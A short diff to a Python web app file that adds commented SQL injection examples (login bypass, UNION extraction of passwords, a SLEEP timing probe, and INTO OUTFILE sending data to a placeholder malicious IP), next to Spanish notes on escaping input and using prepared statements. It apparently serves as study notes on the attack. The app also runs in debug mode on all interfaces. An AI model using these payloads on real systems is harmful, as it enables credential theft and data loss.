@@ -81,5 +81,29 @@ def Region():
 # ' OR 1=1 --
 # ';DELETE FROM USUARIOS;
 # mm' UNION select contraseña from usuario where usuario='migma' --
+
+# select * from user_table where
+# username = 'admin';--' and password = 'mypassword'
+
+# select * from user_table where
+# username = 'admin' and
+# password = 'password' or 1=1;--';
+
+# select title, link from post_table
+# where id < 10
+# union
+# select username, password
+# from user_table; --;
+
+# select * from comments
+# WHERE post_id=1-SLEEP(15);
+
+# select * from post_table
+# into OUTFILE '\\MALICIOUS_IP_ADDRESSlocation'
+
+# Escapar las Entradas del Usuario
+# Utilizar Sentencias Preparadas
+# error403 Forbidden
+
 if __name__=='__main__':
     app.run(debug=True,port=8000,host='0.0.0.0')
